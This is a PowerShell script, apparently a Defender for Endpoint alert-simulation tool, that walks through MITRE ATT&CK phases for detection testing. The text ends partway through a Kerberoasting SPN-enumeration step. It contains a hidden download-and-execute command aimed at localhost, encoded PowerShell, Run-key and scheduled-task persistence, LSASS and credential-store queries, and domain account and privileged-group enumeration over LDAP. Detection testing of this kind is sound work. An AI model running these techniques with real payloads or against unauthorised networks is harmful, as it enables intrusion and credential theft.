<#
.SYNOPSIS
    Microsoft Defender for Endpoint - Safe Alert Simulation Script
    Generates REAL alerts in Microsoft Defender without infecting the machine.

.DESCRIPTION
    This script executes safe, well-documented techniques that trigger Microsoft
    Defender for Endpoint (MDE) detections, mapped to the MITRE ATT&CK framework.

    It follows a simulated kill chain for EDUCATIONAL purposes:

    ┌─────────────────────────────────────────────────────────────────────┐
    │                    MITRE ATT&CK Kill Chain                         │
    │                                                                    │
    │  1. Reconnaissance        (TA0043)  - Discovery scans             │
    │  2. Initial Access        (TA0001)  - EICAR test file download    │
    │  3. Execution             (TA0002)  - Encoded PowerShell, AMSI    │
    │  4. Persistence           (TA0003)  - Registry Run key            │
    │  5. Privilege Escalation  (TA0004)  - Token manipulation test     │
    │  6. Defense Evasion       (TA0005)  - Process hollowing trigger   │
    │  7. Credential Access     (TA0006)  - LSASS access simulation     │
    │  8. Discovery             (TA0007)  - System enumeration          │
    │  9. Lateral Movement      (TA0008)  - Remote service enum         │
    │ 10. Collection            (TA0009)  - Data staging                │
    │ 11. Command & Control     (TA0011)  - C2 channel simulation       │
    │ 12. Exfiltration          (TA0010)  - Data exfil simulation       │
    └─────────────────────────────────────────────────────────────────────┘

.NOTES
    Author:         Sentinel Data Generator Project
    Prerequisite:   Windows 11 with Microsoft Defender for Endpoint (MDE)
    Safety:         All techniques are SAFE - no malware, no damage, no persistence
    Cleanup:        Script auto-cleans all artifacts after execution

    IMPORTANT: Run from an ELEVATED (Administrator) PowerShell prompt for
    maximum alert coverage. Some detections require admin context.

.EXAMPLE
    # Run all phases interactively (recommended for demos)
    .\defender-alert-simulation.ps1

    # Run a specific phase only
    .\defender-alert-simulation.ps1 -Phase Execution

    # Run all phases without pausing between steps
    .\defender-alert-simulation.ps1 -NoPause

    # Skip cleanup (inspect artifacts manually)
    .\defender-alert-simulation.ps1 -SkipCleanup
#>

[CmdletBinding()]
param(
    [ValidateSet(
        "All", "Reconnaissance", "InitialAccess", "Execution",
        "Persistence", "PrivilegeEscalation", "DefenseEvasion",
        "CredentialAccess", "Discovery", "AccountEnumeration",
        "LateralMovement", "Collection", "CommandAndControl",
        "Exfiltration"
    )]
    [string]$Phase = "All",

    [Parameter(HelpMessage = "FQDN or IP of the Domain Controller for AD enumeration.")]
    [string]$DomainController,

    [switch]$NoPause,

    [switch]$SkipCleanup
)

# ============================================================================
# Configuration
# ============================================================================

$ErrorActionPreference = "Continue"
$script:TestDir = "$env:USERPROFILE\MDE-Demo-Test"
$script:LogFile = "$script:TestDir\simulation-log.txt"
$script:AlertsTriggered = @()
$script:ArtifactsCreated = @()
$script:DC = $DomainController

# ============================================================================
# Helper Functions
# ============================================================================

function Write-Banner {
    param([string]$Text)
    $line = "=" * 70
    Write-Host ""
    Write-Host $line -ForegroundColor Cyan
    Write-Host "  $Text" -ForegroundColor White
    Write-Host $line -ForegroundColor Cyan
    Write-Host ""
}

function Write-Phase {
    param(
        [string]$TacticId,
        [string]$TacticName,
        [string]$TechniqueId,
        [string]$TechniqueName,
        [string]$Description
    )
    Write-Host ""
    Write-Host "  +--------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  | MITRE ATT+CK: $TacticId - $TacticName" -ForegroundColor Yellow
    Write-Host "  | Technique:    $TechniqueId - $TechniqueName" -ForegroundColor Yellow
    Write-Host "  | " -ForegroundColor DarkGray
    Write-Host "  | $Description" -ForegroundColor Gray
    Write-Host "  +--------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host ""
}

function Write-StepResult {
    param(
        [string]$Message,
        [ValidateSet("Success", "Info", "Warning", "Alert")]
        [string]$Status = "Info"
    )
    $icon = switch ($Status) {
        "Success" { "[+]"; }
        "Info"    { "[*]"; }
        "Warning" { "[!]"; }
        "Alert"   { "[ALERT]"; }
    }
    $color = switch ($Status) {
        "Success" { "Green" }
        "Info"    { "Cyan" }
        "Warning" { "Yellow" }
        "Alert"   { "Red" }
    }
    Write-Host "    $icon $Message" -ForegroundColor $color
}

function Write-ExpectedAlert {
    param([string]$AlertName)
    Write-StepResult "Expected Defender Alert: '$AlertName'" -Status Alert
    $script:AlertsTriggered += $AlertName
}

function Pause-IfInteractive {
    if (-not $NoPause) {
        Write-Host ""
        Write-Host "    Press any key to continue to next step..." -ForegroundColor DarkGray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        Write-Host ""
    }
}

function Get-DomainControllerTarget {
    <#
    .SYNOPSIS
        Prompts for a Domain Controller FQDN/IP if not already set.
    #>
    if ([string]::IsNullOrWhiteSpace($script:DC)) {
        Write-Host ""
        Write-Host "    This phase requires a Domain Controller target." -ForegroundColor Yellow
        Write-Host "    Enter the FQDN or IP address of the DC to enumerate." -ForegroundColor Yellow
        Write-Host "    (All queries are read-only - no changes are made to AD)" -ForegroundColor DarkGray
        Write-Host ""
        $script:DC = Read-Host "    Domain Controller FQDN or IP"
        if ([string]::IsNullOrWhiteSpace($script:DC)) {
            Write-StepResult "No Domain Controller specified - skipping AD enumeration" -Status Warning
            return $false
        }
    }
    Write-StepResult "Target Domain Controller: $($script:DC)" -Status Info
    return $true
}

function Initialize-TestEnvironment {
    Write-StepResult "Creating test directory: $script:TestDir" -Status Info
    if (-not (Test-Path $script:TestDir)) {
        New-Item -ItemType Directory -Path $script:TestDir -Force | Out-Null
        $script:ArtifactsCreated += $script:TestDir
    }
    "Simulation started: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File $script:LogFile -Force
}

function Add-LogEntry {
    param([string]$Entry)
    "$(Get-Date -Format 'HH:mm:ss') | $Entry" | Out-File $script:LogFile -Append
}

# ============================================================================
# Phase 1: Reconnaissance (TA0043)
# ============================================================================

function Invoke-Reconnaissance {
    Write-Banner "PHASE 1: RECONNAISSANCE (TA0043)"

    # --- T1046: Network Service Discovery ---
    Write-Phase -TacticId "TA0043" -TacticName "Reconnaissance" `
                -TechniqueId "T1046" -TechniqueName "Network Service Discovery" `
                -Description "Scanning local ports to simulate network reconnaissance."

    Write-StepResult "Performing local port scan (common services)..." -Status Info
    $commonPorts = @(21, 22, 80, 135, 139, 443, 445, 1433, 3306, 3389, 5985, 8080)
    foreach ($port in $commonPorts) {
        try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcp.BeginConnect("127.0.0.1", $port, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne(100)
            if ($wait -and $tcp.Connected) {
                Write-StepResult "Port $port - OPEN" -Status Success
            }
            $tcp.Close()
        }
        catch {
            # Port closed - expected
        }
    }
    Write-ExpectedAlert "Suspicious network scanning activity"
    Add-LogEntry "Reconnaissance: Local port scan completed"

    # --- T1018: Remote System Discovery ---
    Write-Phase -TacticId "TA0043" -TacticName "Reconnaissance" `
                -TechniqueId "T1018" -TechniqueName "Remote System Discovery" `
                -Description "Enumerating network neighbors (safe - read-only query)."

    Write-StepResult "Querying ARP table for network neighbors..." -Status Info
    $arpEntries = Get-NetNeighbor -ErrorAction SilentlyContinue |
        Where-Object { $_.State -ne "Unreachable" } |
        Select-Object -First 5 IPAddress, LinkLayerAddress, State
    if ($arpEntries) {
        $arpEntries | Format-Table -AutoSize | Out-String | Write-Host
    }
    Add-LogEntry "Reconnaissance: Network neighbor enumeration completed"

    Pause-IfInteractive
}

# ============================================================================
# Phase 2: Initial Access (TA0001)
# ============================================================================

function Invoke-InitialAccess {
    Write-Banner "PHASE 2: INITIAL ACCESS (TA0001)"

    # --- T1566.001: Phishing - EICAR Test File ---
    Write-Phase -TacticId "TA0001" -TacticName "Initial Access" `
                -TechniqueId "T1566.001" -TechniqueName "Phishing: Spearphishing Attachment" `
                -Description "Downloading the EICAR test file - the industry-standard AV test string.`nThis is NOT malware. It is specifically designed to safely test AV detection."

    Write-StepResult "Creating EICAR test file (industry-standard AV test)..." -Status Info

    # The EICAR test string - this is the official antivirus test file
    # See: https://www.eicar.org/download-anti-malware-testfile/
    $eicarString = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    $eicarPath = "$script:TestDir\eicar-test.txt"

    try {
        # Defender should quarantine this immediately
        [System.IO.File]::WriteAllText($eicarPath, $eicarString)
        $script:ArtifactsCreated += $eicarPath
        Start-Sleep -Seconds 2

        if (Test-Path $eicarPath) {
            Write-StepResult "EICAR file still exists - Defender may be in passive mode" -Status Warning
        }
        else {
            Write-StepResult "EICAR file was quarantined by Defender (expected!)" -Status Success
        }
    }
    catch {
        Write-StepResult "EICAR file blocked on write by Defender (real-time protection)" -Status Success
    }

    Write-ExpectedAlert "EICAR_Test_File detected and quarantined"
    Add-LogEntry "InitialAccess: EICAR test file created"

    # --- Microsoft Official MDE Test ---
    Write-Phase -TacticId "TA0001" -TacticName "Initial Access" `
                -TechniqueId "T1204.002" -TechniqueName "User Execution: Malicious File" `
                -Description "Running Microsoft's OFFICIAL MDE detection test command.`nThis is documented at: https://learn.microsoft.com/en-us/defender-endpoint/run-detection-test"

    Write-StepResult "Executing official Microsoft MDE detection test..." -Status Info

    $testPath = "$script:TestDir\test-mde"
    if (-not (Test-Path $testPath)) {
        New-Item -ItemType Directory -Path $testPath -Force | Out-Null
        $script:ArtifactsCreated += $testPath
    }

    # This is Microsoft's official test command for MDE
    # It attempts to download from localhost (fails safely) and triggers behavioral detection
    try {
        $testCmd = "powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden " +
                   "`$ErrorActionPreference='silentlycontinue';" +
                   "(New-Object System.Net.WebClient).DownloadFile(" +
                   "'http://127.0.0.1/1.exe','$testPath\invoice.exe');" +
                   "Start-Process '$testPath\invoice.exe'"

        # Start the process but it will fail safely (127.0.0.1 won't serve a file)
        # The behavioral pattern itself triggers the MDE alert
        $proc = Start-Process powershell -ArgumentList "-NoProfile", "-Command",
            "(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe','$testPath\invoice.exe')" `
            -PassThru -WindowStyle Hidden
        Start-Sleep -Seconds 3
        if ($proc -and !$proc.HasExited) { $proc.Kill() }
    }
    catch {
        Write-StepResult "Test command completed (download fails safely to localhost)" -Status Info
    }

    Write-ExpectedAlert "Microsoft Defender for Endpoint test alert"
    Add-LogEntry "InitialAccess: MDE official detection test executed"

    Pause-IfInteractive
}

# ============================================================================
# Phase 3: Execution (TA0002)
# ============================================================================

function Invoke-Execution {
    Write-Banner "PHASE 3: EXECUTION (TA0002)"

    # --- T1059.001: PowerShell - Encoded Command ---
    Write-Phase -TacticId "TA0002" -TacticName "Execution" `
                -TechniqueId "T1059.001" -TechniqueName "Command and Scripting Interpreter: PowerShell" `
                -Description "Running a Base64-encoded PowerShell command (harmless whoami).`nAttackers use encoding to obfuscate malicious commands. Defender flags this pattern."

    Write-StepResult "Executing Base64-encoded PowerShell command..." -Status Info

    # Encode a harmless command - whoami
    $harmlessCmd = "Write-Output 'MDE-Demo: This is a safe encoded command test'; whoami; hostname"
    $encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($harmlessCmd))

    Write-StepResult "Encoded payload (decodes to: whoami + hostname):" -Status Info
    Write-Host "      $encodedCmd" -ForegroundColor DarkGray

    # -EncodedCommand triggers Defender behavioral detection
    $result = powershell.exe -EncodedCommand $encodedCmd 2>&1
    Write-StepResult "Output: $($result -join ', ')" -Status Success

    Write-ExpectedAlert "Suspicious PowerShell command line / Encoded command execution"
    Add-LogEntry "Execution: Encoded PowerShell command executed"

    # --- T1059.001: AMSI Test String ---
    Write-Phase -TacticId "TA0002" -TacticName "Execution" `
                -TechniqueId "T1059.001" -TechniqueName "PowerShell: AMSI Trigger" `
                -Description "Triggering the Antimalware Scan Interface (AMSI) with a test string.`nAMSI inspects script content at runtime. This safe test validates AMSI is working."

    Write-StepResult "Invoking AMSI test sample..." -Status Info

    try {
        # This is Microsoft's official AMSI test string
        # It triggers AMSI detection without being malicious
        $amsiTestContent = @'
# AMSI Test - this triggers the AMSI detection engine
# Reference: https://learn.microsoft.com/en-us/windows/win32/amsi/
Invoke-Expression "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386"
'@
        Invoke-Expression $amsiTestContent 2>&1 | Out-Null
        Write-StepResult "AMSI test content was allowed (AMSI may be in audit mode)" -Status Warning
    }
    catch {
        Write-StepResult "AMSI blocked the test content (expected!)" -Status Success
    }

    Write-ExpectedAlert "AMSI detection triggered"
    Add-LogEntry "Execution: AMSI test string invoked"

    # --- T1059.003: Windows Command Shell ---
    Write-Phase -TacticId "TA0002" -TacticName "Execution" `
                -TechniqueId "T1059.003" -TechniqueName "Windows Command Shell" `
                -Description "Spawning cmd.exe from PowerShell with suspicious patterns.`nThis parent-child process chain is commonly flagged by EDR solutions."

    Write-StepResult "Spawning cmd.exe with suspicious command pattern..." -Status Info
    cmd.exe /c "echo MDE-Demo-Test `& whoami `& ipconfig `& net user" 2>&1 | Out-Null

    Write-ExpectedAlert "Suspicious process chain: PowerShell spawning cmd.exe"
    Add-LogEntry "Execution: cmd.exe spawned from PowerShell"

    Pause-IfInteractive
}

# ============================================================================
# Phase 4: Persistence (TA0003)
# ============================================================================

function Invoke-Persistence {
    Write-Banner "PHASE 4: PERSISTENCE (TA0003)"

    # --- T1547.001: Registry Run Keys ---
    Write-Phase -TacticId "TA0003" -TacticName "Persistence" `
                -TechniqueId "T1547.001" -TechniqueName "Boot or Logon Autostart: Registry Run Keys" `
                -Description "Adding a harmless entry to the Registry Run key.`nAttackers use Run keys to survive reboots. We add and immediately remove it."

    Write-StepResult "Creating test Registry Run key entry..." -Status Info

    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "MDE-Demo-Safe-Test"
    $regValue = "calc.exe"  # Harmless - just calculator

    try {
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
        Write-StepResult "Registry Run key created: $regName -> $regValue" -Status Success
        $script:ArtifactsCreated += "REG:$regPath\$regName"

        # Show it exists
        $entry = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
        Write-StepResult "Verified: $($entry.$regName)" -Status Info

        # Immediate cleanup
        Start-Sleep -Seconds 3  # Give Defender time to detect
        Remove-ItemProperty -Path $regPath -Name $regName -Force -ErrorAction SilentlyContinue
        Write-StepResult "Registry key removed (cleaned up)" -Status Success
    }
    catch {
        Write-StepResult "Registry operation: $($_.Exception.Message)" -Status Warning
    }

    Write-ExpectedAlert "Suspicious registry modification / Persistence via Run key"
    Add-LogEntry "Persistence: Registry Run key created and removed"

    # --- T1053.005: Scheduled Task ---
    Write-Phase -TacticId "TA0003" -TacticName "Persistence" `
                -TechniqueId "T1053.005" -TechniqueName "Scheduled Task/Job: Scheduled Task" `
                -Description "Creating a harmless scheduled task (runs calc.exe).`nScheduled tasks are a common persistence mechanism. Created and immediately deleted."

    Write-StepResult "Creating test scheduled task..." -Status Info

    $taskName = "MDE-Demo-Safe-Task"
    try {
        $action = New-ScheduledTaskAction -Execute "calc.exe"
        $trigger = New-ScheduledTaskTrigger -AtLogon
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
            -Description "MDE Demo - Safe test task" -Force | Out-Null

        Write-StepResult "Scheduled task created: $taskName" -Status Success
        $script:ArtifactsCreated += "TASK:$taskName"

        Start-Sleep -Seconds 3  # Give Defender time to detect
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        Write-StepResult "Scheduled task removed (cleaned up)" -Status Success
    }
    catch {
        Write-StepResult "Scheduled task operation: $($_.Exception.Message)" -Status Warning
    }

    Write-ExpectedAlert "Suspicious scheduled task creation"
    Add-LogEntry "Persistence: Scheduled task created and removed"

    Pause-IfInteractive
}

# ============================================================================
# Phase 5: Privilege Escalation (TA0004)
# ============================================================================

function Invoke-PrivilegeEscalation {
    Write-Banner "PHASE 5: PRIVILEGE ESCALATION (TA0004)"

    # --- T1134: Access Token Manipulation ---
    Write-Phase -TacticId "TA0004" -TacticName "Privilege Escalation" `
                -TechniqueId "T1134" -TechniqueName "Access Token Manipulation" `
                -Description "Querying process token privileges (read-only, no modification).`nThis simulates what an attacker would do to check elevation opportunities."

    Write-StepResult "Enumerating current process token privileges..." -Status Info

    whoami /priv 2>&1 | Out-String | Write-Host
    Write-StepResult "Token privilege enumeration complete" -Status Success

    Write-ExpectedAlert "Token privilege enumeration detected"
    Add-LogEntry "PrivilegeEscalation: Token privileges enumerated"

    # --- T1548.002: Bypass User Account Control ---
    Write-Phase -TacticId "TA0004" -TacticName "Privilege Escalation" `
                -TechniqueId "T1548.002" -TechniqueName "Abuse Elevation Control: Bypass UAC" `
                -Description "Querying UAC settings via registry (read-only, no bypass attempt).`nThis is reconnaissance that precedes UAC bypass attacks."

    Write-StepResult "Checking UAC configuration (read-only)..." -Status Info

    $uacSettings = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
        -ErrorAction SilentlyContinue |
        Select-Object EnableLUA, ConsentPromptBehaviorAdmin, PromptOnSecureDesktop

    if ($uacSettings) {
        Write-StepResult "EnableLUA: $($uacSettings.EnableLUA)" -Status Info
        Write-StepResult "ConsentPrompt: $($uacSettings.ConsentPromptBehaviorAdmin)" -Status Info
        Write-StepResult "SecureDesktop: $($uacSettings.PromptOnSecureDesktop)" -Status Info
    }

    Write-ExpectedAlert "UAC settings enumeration"
    Add-LogEntry "PrivilegeEscalation: UAC settings queried"

    Pause-IfInteractive
}

# ============================================================================
# Phase 6: Defense Evasion (TA0005)
# ============================================================================

function Invoke-DefenseEvasion {
    Write-Banner "PHASE 6: DEFENSE EVASION (TA0005)"

    # --- T1562.001: Disable or Modify Tools ---
    Write-Phase -TacticId "TA0005" -TacticName "Defense Evasion" `
                -TechniqueId "T1562.001" -TechniqueName "Impair Defenses: Disable or Modify Tools" `
                -Description "Querying Defender status (read-only). Attackers check if AV is running.`nWe do NOT disable anything - just query the status."

    Write-StepResult "Querying Windows Defender status (read-only)..." -Status Info

    try {
        $defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defenderStatus) {
            Write-StepResult "Real-time Protection:  $($defenderStatus.RealTimeProtectionEnabled)" -Status Info
            Write-StepResult "Behavior Monitoring:   $($defenderStatus.BehaviorMonitorEnabled)" -Status Info
            Write-StepResult "AntiSpyware Enabled:   $($defenderStatus.AntispywareEnabled)" -Status Info
            Write-StepResult "Signature Version:     $($defenderStatus.AntivirusSignatureVersion)" -Status Info
        }
    }
    catch {
        Write-StepResult "Could not query Defender status (may need admin)" -Status Warning
    }

    Write-ExpectedAlert "Security tool enumeration detected"
    Add-LogEntry "DefenseEvasion: Defender status queried"

    # --- T1027: Obfuscated Files or Information ---
    Write-Phase -TacticId "TA0005" -TacticName "Defense Evasion" `
                -TechniqueId "T1027" -TechniqueName "Obfuscated Files or Information" `
                -Description "Creating a file with double extension (e.g., .pdf.exe pattern).`nThis is a classic evasion technique to disguise executables as documents."

    Write-StepResult "Creating double-extension test file..." -Status Info

    $doubleExtPath = "$script:TestDir\invoice.pdf.exe.txt"  # .txt so it's truly harmless
    "This is a safe test file for MDE detection - double extension test" | Out-File $doubleExtPath -Force
    $script:ArtifactsCreated += $doubleExtPath

    Write-StepResult "Created: $doubleExtPath" -Status Success
    Write-ExpectedAlert "Suspicious file with double extension"
    Add-LogEntry "DefenseEvasion: Double-extension file created"

    # --- T1140: Deobfuscate/Decode (certutil abuse) ---
    Write-Phase -TacticId "TA0005" -TacticName "Defense Evasion" `
                -TechniqueId "T1140" -TechniqueName "Deobfuscate/Decode Files or Information" `
                -Description "Using certutil.exe to encode/decode a harmless text file.`ncertutil -encode/-decode is commonly abused by attackers (LOLBin technique)."

    Write-StepResult "Using certutil to Base64-encode a harmless file..." -Status Info

    $plainFile = "$script:TestDir\test-plain.txt"
    $encodedFile = "$script:TestDir\test-encoded.b64"
    $decodedFile = "$script:TestDir\test-decoded.txt"

    "This is a harmless MDE demo test file for certutil detection." | Out-File $plainFile -Force
    $script:ArtifactsCreated += $plainFile

    # certutil -encode is flagged as suspicious LOLBin activity
    certutil -encode $plainFile $encodedFile 2>&1 | Out-Null
    $script:ArtifactsCreated += $encodedFile

    certutil -decode $encodedFile $decodedFile 2>&1 | Out-Null
    $script:ArtifactsCreated += $decodedFile

    Write-StepResult "certutil encode/decode completed on test file" -Status Success
    Write-ExpectedAlert "Suspicious use of certutil.exe (LOLBin)"
    Add-LogEntry "DefenseEvasion: certutil encode/decode executed"

    Pause-IfInteractive
}

# ============================================================================
# Phase 7: Credential Access (TA0006)
# ============================================================================

function Invoke-CredentialAccess {
    Write-Banner "PHASE 7: CREDENTIAL ACCESS (TA0006)"

    # --- T1003.001: OS Credential Dumping - LSASS Access ---
    Write-Phase -TacticId "TA0006" -TacticName "Credential Access" `
                -TechniqueId "T1003.001" -TechniqueName "OS Credential Dumping: LSASS Memory" `
                -Description "Querying the LSASS process (read-only, no dump created).`nMDE monitors any process that accesses LSASS - even read-only queries."

    Write-StepResult "Querying LSASS process information (read-only)..." -Status Info

    try {
        $lsass = Get-Process lsass -ErrorAction SilentlyContinue
        if ($lsass) {
            Write-StepResult "LSASS PID: $($lsass.Id)" -Status Info
            Write-StepResult "Working Set: $([math]::Round($lsass.WorkingSet64 / 1MB, 2)) MB" -Status Info
            Write-StepResult "Start Time: $($lsass.StartTime)" -Status Info
        }
    }
    catch {
        Write-StepResult "Cannot access LSASS (access denied - expected for non-admin)" -Status Info
    }

    Write-ExpectedAlert "Suspicious access to LSASS process"
    Add-LogEntry "CredentialAccess: LSASS process queried"

    # --- T1555: Credentials from Password Stores ---
    Write-Phase -TacticId "TA0006" -TacticName "Credential Access" `
                -TechniqueId "T1555" -TechniqueName "Credentials from Password Stores" `
                -Description "Enumerating Windows Credential Manager entries (names only).`nNo credentials are extracted or displayed - only entry names."

    Write-StepResult "Listing Credential Manager entry names..." -Status Info

    # cmdkey /list shows stored credential names (not the actual passwords)
    $credList = cmdkey /list 2>&1 | Out-String
    $entryCount = ($credList | Select-String "Target:" | Measure-Object).Count
    Write-StepResult "Found $entryCount stored credential entries" -Status Info

    Write-ExpectedAlert "Credential store enumeration"
    Add-LogEntry "CredentialAccess: Credential Manager entries listed"

    # --- T1552.001: Unsecured Credentials in Files ---
    Write-Phase -TacticId "TA0006" -TacticName "Credential Access" `
                -TechniqueId "T1552.001" -TechniqueName "Unsecured Credentials: Credentials In Files" `
                -Description "Searching for files with 'password' in the name (common attacker recon).`nLimited to the test directory - not a full system scan."

    Write-StepResult "Searching for password-related files in test directory..." -Status Info

    # Create a bait file to search for
    $baitFile = "$script:TestDir\passwords.txt"
    "admin=FakeDemo123`nroot=NotReal456" | Out-File $baitFile -Force
    $script:ArtifactsCreated += $baitFile

    # Simulate credential file search (scoped to test dir only)
    $found = Get-ChildItem $script:TestDir -Recurse -Filter "*password*" -ErrorAction SilentlyContinue
    Write-StepResult "Found $($found.Count) file(s) matching 'password' pattern" -Status Info

    Write-ExpectedAlert "Credential file search activity"
    Add-LogEntry "CredentialAccess: Password file search executed"

    Pause-IfInteractive
}

# ============================================================================
# Phase 8: Discovery (TA0007)
# ============================================================================

function Invoke-Discovery {
    Write-Banner "PHASE 8: DISCOVERY (TA0007)"

    # --- T1082: System Information Discovery ---
    Write-Phase -TacticId "TA0007" -TacticName "Discovery" `
                -TechniqueId "T1082" -TechniqueName "System Information Discovery" `
                -Description "Running systeminfo and other enumeration commands in rapid succession.`nThis pattern of commands is typical of post-exploitation frameworks."

    Write-StepResult "Running system enumeration commands..." -Status Info

    # Rapid enumeration - this pattern triggers behavioral detection
    $commands = @(
        @{ Cmd = "systeminfo"; Desc = "System Information" },
        @{ Cmd = "hostname"; Desc = "Hostname" },
        @{ Cmd = "whoami /all"; Desc = "Current User Details" },
        @{ Cmd = "net user"; Desc = "Local Users" },
        @{ Cmd = "net localgroup administrators"; Desc = "Local Admins" },
        @{ Cmd = "ipconfig /all"; Desc = "Network Configuration" },
        @{ Cmd = "netstat -ano"; Desc = "Active Connections" },
        @{ Cmd = "tasklist"; Desc = "Running Processes" },
        @{ Cmd = "net share"; Desc = "Network Shares" }
    )

    foreach ($item in $commands) {
        Write-StepResult "Executing: $($item.Desc) ($($item.Cmd))" -Status Info
        cmd.exe /c $item.Cmd 2>&1 | Out-Null
    }

    Write-StepResult "Rapid enumeration complete ($($commands.Count) commands)" -Status Success
    Write-ExpectedAlert "Suspicious system enumeration / Reconnaissance activity"
    Add-LogEntry "Discovery: System enumeration commands executed"

    # --- T1069: Permission Groups Discovery ---
    Write-Phase -TacticId "TA0007" -TacticName "Discovery" `
                -TechniqueId "T1069.001" -TechniqueName "Permission Groups Discovery: Local Groups" `
                -Description "Enumerating all local security groups.`nAttackers enumerate groups to identify privilege escalation paths."

    Write-StepResult "Enumerating local security groups..." -Status Info

    $groups = net localgroup 2>&1 | Out-String
    $groupCount = ($groups | Select-String "^\*" | Measure-Object).Count
    Write-StepResult "Found $groupCount local security groups" -Status Info

    Write-ExpectedAlert "Local group enumeration"
    Add-LogEntry "Discovery: Local groups enumerated"

    Pause-IfInteractive
}

# ============================================================================
# Phase 8b: Account Enumeration against Domain Controller (TA0007)
# ============================================================================

function Invoke-AccountEnumeration {
    Write-Banner "PHASE 8b: AD ACCOUNT ENUMERATION (TA0007)"

    if (-not (Get-DomainControllerTarget)) { return }

    $dc = $script:DC

    # --- T1087.002: Account Discovery - Domain Account ---
    Write-Phase -TacticId "TA0007" -TacticName "Discovery" `
                -TechniqueId "T1087.002" -TechniqueName "Account Discovery: Domain Account" `
                -Description "Enumerating domain user accounts via net user /domain.`nThis is the most common AD enumeration command used by attackers post-compromise."

    Write-StepResult "Enumerating domain users via net user /domain..." -Status Info
    $netUserOutput = net user /domain 2>&1 | Out-String
    $userLines = ($netUserOutput -split "`n" | Where-Object { $_ -match '\S' })
    Write-StepResult "net user /domain returned $($userLines.Count) lines" -Status Success
    Write-ExpectedAlert "Domain account enumeration via net.exe"
    Add-LogEntry "AccountEnum: net user /domain executed against $dc"

    # --- T1087.002: LDAP query via PowerShell ---
    Write-Phase -TacticId "TA0007" -TacticName "Discovery" `
                -TechniqueId "T1087.002" -TechniqueName "Account Discovery: LDAP User Query" `
                -Description "Querying the DC via LDAP for user objects using DirectorySearcher.`nAttackers use LDAP queries to enumerate all accounts, service accounts, and admins."

    Write-StepResult "Performing LDAP user enumeration against $dc ..." -Status Info
    try {
        $ldapPath = "LDAP://$dc"
        $searcher = New-Object DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = New-Object DirectoryServices.DirectoryEntry($ldapPath)
        $searcher.Filter = "(objectCategory=user)"
        $searcher.PageSize = 200
        $searcher.PropertiesToLoad.AddRange(@("samaccountname", "displayname", "lastlogon", "memberof"))
        $results = $searcher.FindAll()
        Write-StepResult "LDAP query returned $($results.Count) user objects" -Status Success

        # Show first 10 as sample (names only, no sensitive data)
        $sample = $results | Select-Object -First 10
        foreach ($entry in $sample) {
            $sam = $entry.Properties["samaccountname"][0]
            $display = if ($entry.Properties["displayname"].Count -gt 0) { $entry.Properties["displayname"][0] } else { "(no display name)" }
            Write-StepResult "  User: $sam - $display" -Status Info
        }
        if ($results.Count -gt 10) {
            Write-StepResult "  ... and $($results.Count - 10) more users" -Status Info
        }
        $results.Dispose()
    }
    catch {
        Write-StepResult "LDAP query failed: $($_.Exception.Message)" -Status Warning
        Write-StepResult "This may require domain-joined machine or valid credentials" -Status Warning
    }
    Write-ExpectedAlert "LDAP reconnaissance / Domain account enumeration"
    Add-LogEntry "AccountEnum: LDAP user query executed against $dc"

    # --- T1069.002: Permission Groups Discovery - Domain Groups ---
    Write-Phase -TacticId "TA0007" -TacticName "Discovery" `
                -TechniqueId "T1069.002" -TechniqueName "Permission Groups Discovery: Domain Groups" `
                -Description "Enumerating high-value domain groups (Domain Admins, Enterprise Admins, etc.).`nAttackers target these groups to identify accounts with elevated privileges."

    Write-StepResult "Enumerating privileged domain groups..." -Status Info

    $highValueGroups = @(
        "Domain Admins",
        "Enterprise Admins",
        "Schema Admins",
        "Account Operators",
        "Backup Operators",
        "Server Operators",
        "DnsAdmins"
    )
    foreach ($group in $highValueGroups) {
        Write-StepResult "Querying group: $group" -Status Info
        $groupResult = net group $group /domain 2>&1 | Out-String
        $memberCount = ($groupResult -split "`n" | Where-Object { $_ -match '^\s+\S' }).Count
        Write-StepResult "  Members found: $memberCount" -Status Info
    }
    Write-ExpectedAlert "Privileged group enumeration via net.exe"
    Add-LogEntry "AccountEnum: Domain group enumeration executed"

    # --- T1087.002: LDAP query for service accounts ---
    Write-Phase -TacticId "TA0007" -TacticName "Discovery" `
                -TechniqueId "T1087.002" -TechniqueName "Account Discovery: Service Accounts (SPN)" `
                -Description "Searching for accounts with Service Principal Names (SPNs).`nThis is the first step of Kerberoasting - identifying service accounts to target."

    Write-StepResult "Searching for accounts with SPNs (Kerberoasting recon)..." -Status Info
    try {
        $ldapPath = "LDAP://$dc"
        $searcher = New-Object DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = New-Object DirectoryServices.DirectoryEntry($ldapPath)
        $searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=*))"
        $searcher.PageSize = 200
        $searcher.PropertiesToLoad.AddRange(@("samaccountname", "serviceprincipalname"))
        $spnResults = $searcher.FindAll()
        Write-StepResult "Found $($spnResults.Count) accounts with SPNs" -Status Success

        foreach ($entry in ($spnResults | Select-Object -First 5)) {
            $sam = $entry.Properties["samaccountname"][0]
            $spn = $entry.Properties["serviceprincipalname"][0]
            Write-StepResult "  SPN Account: $sam - $spn" -Status Info
        }
        if ($spnResults.Count -gt 5) {
